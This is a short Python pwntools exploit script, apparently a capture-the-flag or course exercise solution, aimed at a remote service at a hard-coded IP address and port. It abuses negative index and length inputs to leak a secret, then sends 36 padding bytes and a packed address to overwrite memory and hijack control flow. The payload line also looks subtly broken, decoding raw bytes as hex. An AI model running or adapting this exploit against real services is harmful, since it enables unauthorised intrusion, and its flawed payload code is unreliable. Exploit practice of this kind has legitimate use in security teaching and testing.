from pwn import *

rem = remote('140.113.194.66', 8787)
###########################################################
recv_data = rem.recvuntil('Your choice: ',drop = False)
rem.sendline('1')
recv_data = rem.recvuntil('Please input id: ',drop = False)
rem.sendline('-1')
recv_data = rem.recvuntil('Age: ',drop = False)
secret_info = rem.recvline(keepends = False)
print(recv_data)
############################################################
recv_data = rem.recvuntil('Your choice: ',drop = False)
rem.sendline('2')
recv_data = rem.recvuntil('Please input secret first: ',drop = False)
rem.sendline(secret_info)
recv_data = rem.recvuntil('Please input id: ',drop = False)
rem.sendline('1')
recv_data = rem.recvuntil('Input new note length: ',drop = False)
rem.sendline('-1')
#############################################################
malicious_str = "\xe0\x89\x04\x08".decode("hex")
print('malicious_str is ', malicious_str)
magic1_addr = ("A" * 36 ) + malicious_str
rem.sendline(magic1_addr)
# rem.interactive()
# rem.send('-1\r\n')
